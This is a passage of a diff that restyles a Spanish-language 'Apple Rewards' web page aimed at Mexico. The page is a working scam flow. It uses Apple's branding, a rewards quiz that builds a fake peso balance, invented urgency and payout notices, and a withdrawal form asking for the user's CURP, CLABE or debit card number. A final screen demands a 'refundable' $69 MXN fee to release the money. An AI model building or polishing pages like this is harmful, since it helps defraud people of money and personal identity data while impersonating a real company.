@@ -22,7 +22,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            background: linear-gradient(160deg, #f5f5f7 0%, #e8e8ed 50%, #f0f0f5 100%);
+            background: linear-gradient(135deg, #f5f5f7 0%, #e8e8ed 100%);
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex; justify-content: center;
             align-items: flex-start; min-height: 100vh;
@@ -30,46 +30,204 @@
             overflow-x: hidden;
         }
 
-        /* SPLASH SCREEN */
-        .splash-screen {
-            position: fixed; inset: 0;
-            background: linear-gradient(135deg, #1d1d1f 0%, #0a0a0a 100%);
+        /* ===== SPLASH SCREEN PREMIUM ===== */
+        #splashScreen {
+            position: fixed; inset: 0; z-index: 99999;
+            background: #000;
             display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            z-index: 99999;
-            transition: opacity 0.8s ease, visibility 0.8s ease;
+            align-items: center; justify-content: center;
+            transition: opacity 0.8s ease, transform 0.8s ease;
         }
-        .splash-screen.hide {
-            opacity: 0; visibility: hidden;
+        #splashScreen.hide {
+            opacity: 0;
+            transform: scale(1.05);
+            pointer-events: none;
         }
-        .splash-logo-big {
-            width: 80px; height: 80px;
-            animation: splashPulse 1.5s ease-in-out infinite;
-            margin-bottom: 20px;
+
+        .splash-bg-glow {
+            position: absolute;
+            width: 300px; height: 300px;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            animation: splashGlow 4s ease-in-out infinite alternate;
         }
-        .splash-text {
-            color: #fff; font-size: 22px; font-weight: 800;
-            letter-spacing: -0.5px; margin-bottom: 8px;
+        .splash-glow-1 {
+            background: #0071e3;
+            top: 20%; left: 10%;
+            animation-delay: 0s;
         }
-        .splash-sub {
-            color: rgba(255,255,255,0.5); font-size: 13px; font-weight: 500;
+        .splash-glow-2 {
+            background: #5e5ce6;
+            bottom: 20%; right: 10%;
+            animation-delay: 2s;
         }
-        .splash-bar-wrap {
-            width: 200px; height: 4px; background: rgba(255,255,255,0.1);
-            border-radius: 10px; margin-top: 30px; overflow: hidden;
+        .splash-glow-3 {
+            background: #bf5af2;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px; height: 200px;
+            animation-delay: 1s;
         }
-        .splash-bar-fill {
-            width: 0%; height: 100%;
-            background: linear-gradient(90deg, var(--apple-blue), #34aadc);
+        @keyframes splashGlow {
+            0% { opacity: 0.2; transform: scale(1); }
+            100% { opacity: 0.5; transform: scale(1.3); }
+        }
+
+        .splash-content {
+            position: relative; z-index: 2;
+            display: flex; flex-direction: column;
+            align-items: center; gap: 28px;
+        }
+
+        .splash-logo-ring {
+            width: 110px; height: 110px;
+            border-radius: 28px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.03));
+            border: 1px solid rgba(255,255,255,0.08);
+            display: flex; align-items: center; justify-content: center;
+            animation: splashLogoIn 1s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            opacity: 0;
+            backdrop-filter: blur(20px);
+            position: relative;
+            overflow: hidden;
+        }
+        .splash-logo-ring::before {
+            content: '';
+            position: absolute; inset: -2px;
+            border-radius: 30px;
+            background: conic-gradient(from 0deg, transparent, rgba(0,113,227,0.5), transparent, rgba(191,90,242,0.5), transparent);
+            animation: splashRingSpin 3s linear infinite;
+            z-index: -1;
+        }
+        .splash-logo-ring::after {
+            content: '';
+            position: absolute; inset: 2px;
+            border-radius: 26px;
+            background: rgba(0,0,0,0.9);
+            z-index: -1;
+        }
+        @keyframes splashRingSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes splashLogoIn {
+            0% { opacity: 0; transform: scale(0.5) rotate(-10deg); }
+            100% { opacity: 1; transform: scale(1) rotate(0deg); }
+        }
+
+        .splash-apple-icon {
+            width: 52px; height: 52px;
+            filter: drop-shadow(0 0 20px rgba(0,113,227,0.4));
+        }
+
+        .splash-text-group {
+            text-align: center;
+            animation: splashTextIn 0.8s ease forwards;
+            animation-delay: 0.4s;
+            opacity: 0;
+        }
+        @keyframes splashTextIn {
+            0% { opacity: 0; transform: translateY(15px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .splash-title {
+            font-size: 22px; font-weight: 800;
+            color: #fff; letter-spacing: -0.5px;
+            margin-bottom: 6px;
+        }
+        .splash-subtitle {
+            font-size: 13px; color: rgba(255,255,255,0.45);
+            font-weight: 500; letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .splash-progress-area {
+            width: 220px;
+            animation: splashBarIn 0.6s ease forwards;
+            animation-delay: 0.8s;
+            opacity: 0;
+        }
+        @keyframes splashBarIn {
+            0% { opacity: 0; transform: scaleX(0.7); }
+            100% { opacity: 1; transform: scaleX(1); }
+        }
+        .splash-progress-track {
+            width: 100%; height: 4px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 10px; overflow: hidden;
+        }
+        .splash-progress-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #0071e3, #5e5ce6, #bf5af2);
             border-radius: 10px;
             transition: width 0.3s ease;
+            position: relative;
         }
-        .splash-flag {
-            margin-top: 20px; font-size: 32px;
+        .splash-progress-fill::after {
+            content: '';
+            position: absolute; right: 0; top: -2px;
+            width: 8px; height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            box-shadow: 0 0 12px rgba(0,113,227,0.8);
         }
-        @keyframes splashPulse {
-            0%,100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
+        .splash-percent {
+            text-align: center;
+            font-size: 12px; color: rgba(255,255,255,0.35);
+            margin-top: 10px; font-weight: 600;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .splash-status {
+            font-size: 12px;
+            color: rgba(255,255,255,0.3);
+            font-weight: 500;
+            animation: splashStatusIn 0.5s ease forwards;
+            animation-delay: 1.2s;
+            opacity: 0;
+            min-height: 16px;
+        }
+        @keyframes splashStatusIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .splash-mx-flag {
+            display: flex; gap: 0; border-radius: 4px; overflow: hidden;
+            animation: splashFlagIn 0.5s ease forwards;
+            animation-delay: 1s;
+            opacity: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        @keyframes splashFlagIn {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .splash-mx-flag span {
+            width: 20px; height: 14px; display: block;
+        }
+        .flag-green { background: #006847; }
+        .flag-white { background: #fff; }
+        .flag-red { background: #ce1126; }
+
+        /* ===== PARTICLES ===== */
+        .splash-particles {
+            position: absolute; inset: 0;
+            overflow: hidden; z-index: 1;
+        }
+        .splash-particle {
+            position: absolute;
+            width: 2px; height: 2px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+            animation: particleFloat linear infinite;
+        }
+        @keyframes particleFloat {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
 
         /* NOTIFICACIONES */
@@ -98,8 +256,7 @@
         .notif-content { flex: 1; }
         .notif-title { font-size: 13px; font-weight: 700; color: #1d1d1f; }
         .notif-text { font-size: 12px; color: var(--text-gray); margin-top: 2px; }
-        .notif-time { font-size: 10px; color: #bbb; margin-top: 3px; }
-        .notif-badge { background: var(--success); color: #fff; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 20px; white-space: nowrap; }
+        .notif-badge { background: var(--success); color: #fff; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 20px; }
 
         /* ANIMACIONES */
         .shine { animation: shine 0.8s ease-out; }
@@ -110,14 +267,12 @@
         }
 
         @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.03); } }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes glow { 0%,100% { box-shadow: 0 0 5px rgba(0,113,227,0.3); } 50% { box-shadow: 0 0 20px rgba(0,113,227,0.6); } }
         @keyframes coinDrop {
-            0% { opacity: 1; transform: translateY(0) scale(1) rotate(0deg); }
-            50% { opacity: 1; transform: translateY(-40px) scale(1.2) rotate(180deg); }
-            100% { opacity: 0; transform: translateY(-80px) scale(0.3) rotate(360deg); }
+            0% { opacity: 1; transform: translateY(0) scale(1); }
+            100% { opacity: 0; transform: translateY(-60px) scale(0.5); }
         }
         @keyframes shimmer {
             0% { background-position: -200% 0; }
@@ -129,32 +284,10 @@
         }
         @keyframes float {
             0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-        @keyframes confettiBurst {
-            0% { transform: scale(0); opacity: 1; }
-            100% { transform: scale(1.5); opacity: 0; }
-        }
-        @keyframes slideInLeft {
-            from { opacity: 0; transform: translateX(-30px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        @keyframes numberCount {
-            from { opacity: 0; transform: scale(0.5); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        @keyframes borderGlow {
-            0%,100% { border-color: rgba(0,113,227,0.3); }
-            50% { border-color: rgba(0,113,227,0.8); }
-        }
-        @keyframes checkmark {
-            0% { transform: scale(0) rotate(-45deg); opacity: 0; }
-            50% { transform: scale(1.3) rotate(0deg); opacity: 1; }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+            50% { transform: translateY(-5px); }
         }
 
-        .fade-in { animation: fadeInUp 0.5s ease-out forwards; }
-        .fade-in-scale { animation: fadeInScale 0.4s ease-out forwards; }
+        .fade-in { animation: fadeInUp 0.5s ease-out; }
         .slide-down { animation: slideDown 0.3s ease-out; }
 
         /* CONTENEDORES */
@@ -163,14 +296,6 @@
             margin: 20px auto; border-radius: 24px; padding: 28px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.03);
             animation: fadeInUp 0.6s ease-out;
-            position: relative;
-        }
-
-        /* RIBBON MEXICO */
-        .mexico-ribbon {
-            position: absolute; top: -1px; left: 0; right: 0;
-            height: 4px; border-radius: 24px 24px 0 0;
-            background: linear-gradient(90deg, #006847 33%, #fff 33%, #fff 66%, #ce1126 66%);
         }
 
         /* BARRA DE URGENCIA */
@@ -211,54 +336,13 @@
             content: '💰';
             margin-right: 4px;
         }
-        .money-box.earning {
-            animation: borderGlow 0.5s ease;
-            transform: scale(1.05);
-        }
 
         /* COIN ANIMATION */
         .coin-float {
-            position: fixed;
-            font-size: 22px;
+            position: absolute;
+            font-size: 20px;
             pointer-events: none;
-            animation: coinDrop 1.2s ease-out forwards;
-            z-index: 9999;
-        }
-
-        /* STREAK COUNTER */
-        .streak-bar {
-            display: flex; align-items: center; justify-content: center;
-            gap: 6px; margin-bottom: 18px;
-            padding: 8px 0;
-        }
-        .streak-dot {
-            width: 28px; height: 28px;
-            border-radius: 50%;
-            background: #e5e5ea;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 11px; font-weight: 800; color: #bbb;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-        }
-        .streak-dot.completed {
-            background: linear-gradient(135deg, var(--success), var(--success-dark));
-            color: #fff;
-            transform: scale(1.1);
-            box-shadow: 0 2px 10px rgba(0,200,81,0.3);
-        }
-        .streak-dot.current {
-            background: linear-gradient(135deg, var(--apple-blue), #34aadc);
-            color: #fff;
-            animation: pulse 1.5s infinite;
-            box-shadow: 0 2px 10px rgba(0,113,227,0.3);
-        }
-        .streak-connector {
-            width: 12px; height: 2px;
-            background: #e5e5ea;
-            transition: background 0.3s ease;
-        }
-        .streak-connector.done {
-            background: var(--success);
+            animation: coinDrop 1s ease-out forwards;
         }
 
         /* PROGRESS */
@@ -269,7 +353,7 @@
         }
         .progress-bar {
             height: 100%; width: 0%;
-            background: linear-gradient(90deg, var(--apple-blue), #34aadc, #5ac8fa);
+            background: linear-gradient(90deg, var(--apple-blue), #34aadc);
             transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
             border-radius: 10px;
             position: relative;
@@ -299,13 +383,12 @@
             transition: all 0.25s ease; font-weight: 600; font-size: 15px;
             display: flex; align-items: center; gap: 12px;
             position: relative; overflow: hidden;
-            opacity: 0;
         }
         .option::before {
             content: '';
             position: absolute;
             left: 0; top: 0; bottom: 0;
-            width: 0; background: rgba(0,113,227,0.06);
+            width: 0; background: rgba(0,113,227,0.08);
             transition: width 0.3s ease;
         }
         .option:hover {
@@ -313,18 +396,16 @@
             transform: translateX(4px);
         }
         .option:hover::before { width: 100%; }
-        .option:active { transform: scale(0.97); }
+        .option:active { transform: scale(0.98); }
         .option.selected {
             border: 2px solid var(--apple-blue);
             background: linear-gradient(135deg, #f0f7ff, #e8f4fd);
             box-shadow: 0 4px 15px rgba(0,113,227,0.15);
-            transform: translateX(4px);
         }
         .option.selected::after {
             content: '✓';
             position: absolute; right: 16px;
             color: var(--apple-blue); font-weight: 900; font-size: 18px;
-            animation: checkmark 0.3s ease-out;
         }
 
         /* BOTONES */
@@ -339,7 +420,6 @@
             letter-spacing: 0.3px;
             position: relative;
             overflow: hidden;
-            font-family: 'Inter', sans-serif;
         }
         .btn-primary::before {
             content: '';
@@ -350,7 +430,7 @@
         }
         .btn-primary:hover::before { left: 100%; }
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.2); }
-        .btn-primary:disabled { opacity: 0.35; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
+        .btn-primary:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }
         .btn-primary:active { transform: scale(0.98); }
 
         .btn-success {
@@ -368,13 +448,6 @@
             box-shadow: 0 8px 30px rgba(0,113,227,0.4);
         }
 
-        .btn-mexico {
-            background: linear-gradient(135deg, #006847, #009B3A);
-        }
-        .btn-mexico:hover {
-            box-shadow: 0 8px 30px rgba(0,155,58,0.4);
-        }
-
         /* LOADER */
         .loader {
             border: 3px solid #f3f3f3; border-top: 3px solid var(--apple-blue);
@@ -387,49 +460,30 @@
         /* POPUP */
         .popup {
             position: fixed; inset: 0; background: rgba(0,0,0,0.6);
-            display: none; justify-content: center; align-items: center; z-index: 10000;
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
         }
         .popup-box {
             background: #fff; width: 88%; max-width: 360px;
             padding: 35px 30px; border-radius: 28px; text-align: center;
-            animation: fadeInScale 0.4s ease-out;
-            box-shadow: 0 25px 70px rgba(0,0,0,0.25);
-            position: relative;
-            overflow: hidden;
-        }
-        .popup-box::before {
-            content: '';
-            position: absolute; top: 0; left: 0; right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #006847 33%, #fff 33%, #fff 66%, #ce1126 66%);
+            animation: fadeInUp 0.4s ease-out;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
         }
         .popup-icon {
-            font-size: 55px; margin-bottom: 10px;
+            font-size: 50px; margin-bottom: 10px;
             animation: float 2s ease-in-out infinite;
         }
         .popup-valor {
-            font-size: 40px; font-weight: 900; color: var(--success);
+            font-size: 38px; font-weight: 900; color: var(--success);
             margin: 12px 0; letter-spacing: -1px;
         }
         .popup-label {
             font-size: 13px; color: var(--text-gray); font-weight: 500;
-            margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px;
+            margin-bottom: 5px;
         }
         .popup-subtitle {
             font-size: 14px; color: #666; margin-bottom: 20px;
-        }
-
-        /* COUNTER ANIMATION IN POPUP */
-        .popup-reward-tag {
-            display: inline-block;
-            background: linear-gradient(135deg, #fff8e1, #fff3c4);
-            color: #e6a200;
-            font-size: 12px; font-weight: 800;
-            padding: 5px 14px; border-radius: 20px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(245,166,35,0.3);
         }
 
         /* RESGATE */
@@ -438,32 +492,16 @@
         .saldo-display {
             background: linear-gradient(135deg, #f0fdf4, #dcfce7);
             border: 2px solid rgba(0,200,81,0.2);
-            border-radius: 20px; padding: 26px; text-align: center;
+            border-radius: 20px; padding: 24px; text-align: center;
             margin-bottom: 24px;
-            position: relative;
-            overflow: hidden;
-        }
-        .saldo-display::before {
-            content: '🇲🇽';
-            position: absolute; top: 10px; right: 14px;
-            font-size: 20px; opacity: 0.5;
         }
         .saldo-label {
-            font-size: 11px; font-weight: 700; color: var(--text-gray);
-            text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px;
+            font-size: 12px; font-weight: 700; color: var(--text-gray);
+            text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 8px;
         }
         .saldo-value {
-            font-size: 38px; font-weight: 900; color: var(--success);
+            font-size: 36px; font-weight: 900; color: var(--success);
             letter-spacing: -1px;
-        }
-
-        /* VERIFICADO BADGE */
-        .verified-badge {
-            display: inline-flex; align-items: center; gap: 5px;
-            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
-            color: #1565c0; font-size: 11px; font-weight: 700;
-            padding: 5px 12px; border-radius: 20px;
-            margin-bottom: 16px;
         }
 
         /* INPUTS */
@@ -497,12 +535,12 @@
         }
         .taxa-item:hover { transform: translateX(4px); }
         .taxa-item .icon {
-            font-size: 24px; width: 48px; height: 48px;
+            font-size: 24px; width: 44px; height: 44px;
             display: flex; align-items: center; justify-content: center;
-            background: #fff; border-radius: 14px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+            background: #fff; border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
         }
-        .taxa-item b { font-size: 14px; display: block; margin-bottom: 3px; }
+        .taxa-item b { font-size: 14px; display: block; margin-bottom: 2px; }
         .taxa-item p { font-size: 12px; margin: 0; color: var(--text-gray); line-height: 1.4; }
 
         /* BADGES */
@@ -511,8 +549,12 @@
             padding: 5px 12px; border-radius: 20px;
             font-size: 11px; font-weight: 700;
         }
-        .badge-secure { background: #e8f5e9; color: #2e7d32; }
-        .badge-fast { background: #fff3e0; color: #e65100; }
+        .badge-secure {
+            background: #e8f5e9; color: #2e7d32;
+        }
+        .badge-fast {
+            background: #fff3e0; color: #e65100;
+        }
 
         /* TRUST INDICATORS */
         .trust-bar {
@@ -537,14 +579,11 @@
             background: linear-gradient(135deg, #1d1d1f, #2d2d2f);
             color: #fff;
         }
-        .conquista-box::before {
-            background: linear-gradient(90deg, var(--gold), #ffd700, var(--gold));
-        }
         .conquista-box h2 { color: #fff; }
         .conquista-box p { color: rgba(255,255,255,0.7); }
         .conquista-valor {
-            font-size: 34px; font-weight: 900;
-            background: linear-gradient(135deg, var(--gold), #ffd700, #ffec3d);
+            font-size: 32px; font-weight: 900;
+            background: linear-gradient(135deg, var(--gold), #ffd700);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin: 12px 0;
@@ -558,7 +597,7 @@
             font-size: 14px; color: var(--text-gray); font-weight: 500;
         }
 
-        /* SECURITY FOOTER */
+        /* SECURITY BADGES */
         .security-footer {
             display: flex; flex-direction: column; align-items: center;
             gap: 8px; margin-top: 20px;
@@ -566,664 +605,206 @@
         .security-badges {
             display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
         }
-
-        /* STATS BAR */
-        .stats-bar {
-            display: flex; justify-content: space-around;
-            background: linear-gradient(135deg, #f8f9fa, #f0f0f5);
-            border-radius: 14px; padding: 14px 8px;
-            margin-bottom: 20px; border: 1px solid #ebebeb;
-        }
-        .stat-item {
-            text-align: center;
-        }
-        .stat-value {
-            font-size: 18px; font-weight: 900; color: var(--text-dark);
-        }
-        .stat-label {
-            font-size: 10px; color: var(--text-gray);
-            text-transform: uppercase; letter-spacing: 0.5px;
-            font-weight: 600; margin-top: 2px;
-        }
-
-        /* PARTICIPANTS */
-        .participants-bar {
-            display: flex; align-items: center; justify-content: center;
-            gap: 8px; margin-bottom: 18px;
-            font-size: 12px; color: var(--text-gray); font-weight: 500;
-        }
-        .avatar-stack {
-            display: flex;
-        }
-        .avatar-stack img {
-            width: 26px; height: 26px; border-radius: 50%;
-            border: 2px solid #fff; margin-left: -8px;
-            object-fit: cover;
-        }
-        .avatar-stack img:first-child { margin-left: 0; }
-        .online-dot {
-            width: 6px; height: 6px; background: var(--success);
-            border-radius: 50%; animation: pulse 1.5s infinite;
-        }
-
-        /* REWARD PREVIEW CARDS */
-        .reward-preview {
-            display: flex; gap: 10px; margin-bottom: 20px;
-            overflow-x: auto; padding-bottom: 5px;
-        }
-        .reward-card {
-            min-width: 100px; background: linear-gradient(135deg, #f8f8fa, #eeeff3);
-            border-radius: 14px; padding: 12px; text-align: center;
-            border: 1px solid #e5e5ea; flex-shrink: 0;
-        }
-        .reward-card .r-icon { font-size: 28px; margin-bottom: 6px; }
-        .reward-card .r-name { font-size: 10px; font-weight: 700; color: var(--text-gray); }
-        .reward-card .r-val { font-size: 13px; font-weight: 800; color: var(--success); margin-top: 2px; }
-
-        /* DIVIDER */
-        .section-divider {
-            display: flex; align-items: center; gap: 10px;
-            margin: 20px 0;
-        }
-        .section-divider::before, .section-divider::after {
-            content: ''; flex: 1; height: 1px; background: #e5e5ea;
-        }
-        .section-divider span {
-            font-size: 11px; font-weight: 700; color: var(--text-gray);
-            text-transform: uppercase; letter-spacing: 1px;
-        }
-
-        /* STEP INDICATOR */
-        .step-indicator {
-            display: flex; justify-content: center; gap: 8px;
-            margin-bottom: 22px;
-        }
-        .step {
-            display: flex; align-items: center; gap: 6px;
-        }
-        .step-num {
-            width: 28px; height: 28px; border-radius: 50%;
-            background: #e5e5ea; display: flex; align-items: center;
-            justify-content: center; font-size: 12px; font-weight: 800;
-            color: #bbb; transition: all 0.3s ease;
-        }
-        .step-num.active {
-            background: var(--apple-blue); color: #fff;
-        }
-        .step-num.done {
-            background: var(--success); color: #fff;
-        }
-        .step-line {
-            width: 30px; height: 2px; background: #e5e5ea;
-        }
-        .step-line.done { background: var(--success); }
     </style>
 </head>
 <body>
 
-    <!-- SPLASH SCREEN -->
-    <div class="splash-screen" id="splashScreen">
-        <img class="splash-logo-big" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-        <div class="splash-text">Apple Rewards</div>
-        <div class="splash-sub">Verificando disponibilidad en México...</div>
-        <div class="splash-flag">🇲🇽</div>
-        <div class="splash-bar-wrap">
-            <div class="splash-bar-fill" id="splashBar"></div>
+<!-- ===== SPLASH SCREEN PREMIUM ===== -->
+<div id="splashScreen">
+    <div class="splash-particles" id="splashParticles"></div>
+    <div class="splash-bg-glow splash-glow-1"></div>
+    <div class="splash-bg-glow splash-glow-2"></div>
+    <div class="splash-bg-glow splash-glow-3"></div>
+    <div class="splash-content">
+        <div class="splash-logo-ring">
+            <img class="splash-apple-icon" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" style="filter: invert(1) drop-shadow(0 0 20px rgba(0,113,227,0.4));">
+        </div>
+        <div class="splash-text-group">
+            <div class="splash-title">Apple Rewards</div>
+            <div class="splash-subtitle">Exclusivo México 🇲🇽</div>
+        </div>
+        <div class="splash-mx-flag">
+            <span class="flag-green"></span>
+            <span class="flag-white"></span>
+            <span class="flag-red"></span>
+        </div>
+        <div class="splash-progress-area">
+            <div class="splash-progress-track">
+                <div class="splash-progress-fill" id="splashFill"></div>
+            </div>
+            <div class="splash-percent" id="splashPercent">0%</div>
+        </div>
+        <div class="splash-status" id="splashStatus">Verificando disponibilidad...</div>
+    </div>
+</div>
+
+<!-- NOTIFICACIÓN -->
+<div class="notification" id="notification">
+    <img class="notif-img" id="notifImg" src="" alt="">
+    <div class="notif-content">
+        <div class="notif-title" id="notifTitle"></div>
+        <div class="notif-text" id="notifText"></div>
+    </div>
+    <span class="notif-badge">SPEI ✓</span>
+</div>
+
+<!-- QUIZ -->
+<div class="container" id="quizContainer" style="display:none;">
+    <div class="urgencia-box">
+        <span class="dot"></span>
+        ⚠️ ÚLTIMOS <span id="vagas">12</span> CUPOS DISPONIBLES EN MÉXICO
+    </div>
+
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+            Apple Rewards
+        </div>
+        <div class="money-box" id="saldoTopo">$0.00 MXN</div>
+    </div>
+
+    <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="progress-text" id="progressText">Pregunta 1 de 12</div>
+
+    <h2 id="qTitle"></h2>
+    <div id="options"></div>
+
+    <button class="btn-primary" id="btnNext" disabled>Continuar ➜</button>
+
+    <div class="trust-bar">
+        <span class="trust-item">🔒 Seguro</span>
+        <span class="trust-item">🇲🇽 México</span>
+        <span class="trust-item">⚡ Instantáneo</span>
+    </div>
+</div>
+
+<!-- RESGATE -->
+<div class="resgate-container" id="resgateContainer">
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+            Apple Rewards
         </div>
     </div>
 
-    <!-- NOTIFICACIÓN -->
-    <div class="notification" id="notification">
-        <img class="notif-img" id="notifImg" src="https://i.pravatar.cc/100?u=1" alt="Usuario">
-        <div class="notif-content">
-            <div class="notif-title" id="notifTitle">Usuario</div>
-            <div class="notif-text" id="notifText">Recibió dinero</div>
-            <div class="notif-time" id="notifTime">Hace 2 min</div>
-        </div>
-        <div class="notif-badge">SPEI ✓</div>
+    <h2>¡Retiro Disponible! 💸</h2>
+
+    <div class="saldo-display">
+        <div class="saldo-label">SALDO TOTAL ACUMULADO</div>
+        <div class="saldo-value" id="saldoFinal">$0.00 MXN</div>
     </div>
 
-    <!-- QUIZ -->
-    <div class="container" id="quizContainer" style="display:none;">
-        <div class="mexico-ribbon"></div>
+    <div class="input-group">
+        <label>Selecciona método de recepción (SPEI):</label>
+        <select id="metodoSelect">
+            <option value="curp">CURP</option>
+            <option value="clabe">CLABE Interbancaria</option>
+            <option value="tarjeta">Número de Tarjeta de Débito</option>
+        </select>
+    </div>
 
-        <div class="urgencia-box">
-            <div class="dot"></div>
-            ⚠️ ÚLTIMOS <span id="vagas">12</span> CUPOS DISPONIBLES EN MÉXICO
+    <div class="input-group">
+        <label id="inputLabel">Ingresa tu CURP:</label>
+        <input type="text" id="chaveInput" placeholder="Ej: GARC850101HDFRRL09">
+    </div>
+
+    <div class="validando-box" id="validando">
+        <div class="loader"></div>
+        Consultando elegibilidad con Apple México...
+    </div>
+
+    <button class="btn-primary btn-success" id="btnSolicitar">REALIZAR RETIRO AHORA</button>
+
+    <div class="security-footer">
+        <div class="security-badges">
+            <span class="badge badge-secure">🔒 Cifrado SSL</span>
+            <span class="badge badge-fast">⚡ SPEI en minutos</span>
         </div>
+    </div>
+</div>
 
-        <div class="topbar">
-            <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-                Apple Rewards
-            </div>
-            <div class="money-box" id="moneyBoxTop">
-                <span id="saldoTopo">$0.00 MXN</span>
-            </div>
-        </div>
+<!-- TAXA -->
+<div class="taxa-container" id="taxaContainer">
+    <div style="text-align:center; margin-bottom: 20px;">
+        <div style="font-size: 40px;">🔐</div>
+        <h2>Verificación de Identidad</h2>
+        <p style="font-size: 14px; color: var(--text-gray);">
+            Para liberar el depósito de <b id="valorComTaxa"></b>, se requiere validar tu cuenta mediante una tasa mínima reembolsable.
+        </p>
+    </div>
 
-        <!-- PARTICIPANTS -->
-        <div class="participants-bar">
-            <div class="avatar-stack">
-                <img src="https://i.pravatar.cc/100?u=10" alt="">
-                <img src="https://i.pravatar.cc/100?u=20" alt="">
-                <img src="https://i.pravatar.cc/100?u=30" alt="">
-                <img src="https://i.pravatar.cc/100?u=40" alt="">
-            </div>
-            <div class="online-dot"></div>
-            <span><strong id="onlineCount">1,847</strong> mexicanos participando ahora</span>
-        </div>
-
-        <!-- STREAK DOTS -->
-        <div class="streak-bar" id="streakBar"></div>
-
-        <div class="progress-wrapper">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        <div class="progress-text" id="progressText">Pregunta 1 de 12</div>
-
-        <h2 id="qTitle"></h2>
-        <div id="options"></div>
-
-        <button class="btn-primary" id="btnNext" disabled>Continuar ➜</button>
-
-        <div class="trust-bar">
-            <div class="trust-item">🔒 Seguro</div>
-            <div class="trust-item">🇲🇽 México</div>
-            <div class="trust-item">⚡ SPEI</div>
-            <div class="trust-item">✅ Verificado</div>
+    <div class="taxa-item">
+        <div class="icon">🔄</div>
+        <div>
+            <b>Importe Reembolsable</b>
+            <p>Los $69 MXN se sumarán a tu retiro automáticamente.</p>
         </div>
     </div>
 
-    <!-- RETIRO -->
-    <div class="resgate-container" id="resgateContainer">
-        <div class="mexico-ribbon"></div>
-
-        <div class="topbar">
-            <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-                Apple Rewards
-            </div>
-        </div>
-
-        <div class="step-indicator">
-            <div class="step"><div class="step-num done">✓</div></div>
-            <div class="step-line done"></div>
-            <div class="step"><div class="step-num active">2</div></div>
-            <div class="step-line"></div>
-            <div class="step"><div class="step-num">3</div></div>
-            <div class="step-line"></div>
-            <div class="step"><div class="step-num">4</div></div>
-        </div>
-
